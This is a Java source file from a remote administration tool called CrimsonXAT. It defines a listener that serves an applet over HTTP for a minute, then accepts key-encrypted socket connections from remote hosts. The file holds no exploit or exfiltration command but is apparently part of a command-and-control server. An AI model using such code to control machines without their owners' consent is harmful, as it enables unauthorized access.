/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.server.network;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import javax.crypto.spec.SecretKeySpec;

import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Reporter;
import subterranean.webserver.AppletServer;

public class AppletListener extends Listener {

	public ArrayList<AppletConnection> connections = new ArrayList<AppletConnection>();

	public AppletListener(String n, int p, SecretKeySpec k) {

		PORT = p;
		name = n;

		key = k;

		this.start();

	}

	public void run() {
		// start http server first
		Logger.add("Starting http listener. port: " + PORT);
		AppletServer as = new AppletServer(PORT);
		try {
			as.start();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		try {
			Thread.sleep(60000);
		} catch (InterruptedException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		as.stop();
		Logger.add("Transforming listener");

		// Create socket to listen on
		ServerSocket serverSock = null;
		try {
			serverSock = new ServerSocket(PORT);
			// accept connections
			while (!Thread.currentThread().isInterrupted()) {

				Socket sock = serverSock.accept();
				if (sock != null) {

					// create new connection and add it to list
					AppletConnection c = null;

					c = new AppletConnection(sock, key);

					c.start();

					connections.add(c);

					// refresh the viewer's host list

				}

			}
			Logger.add("Closing listener on port: " + PORT);
			serverSock.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Reporter.report(e);
		} finally {
			try {
				serverSock.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}
	}

}
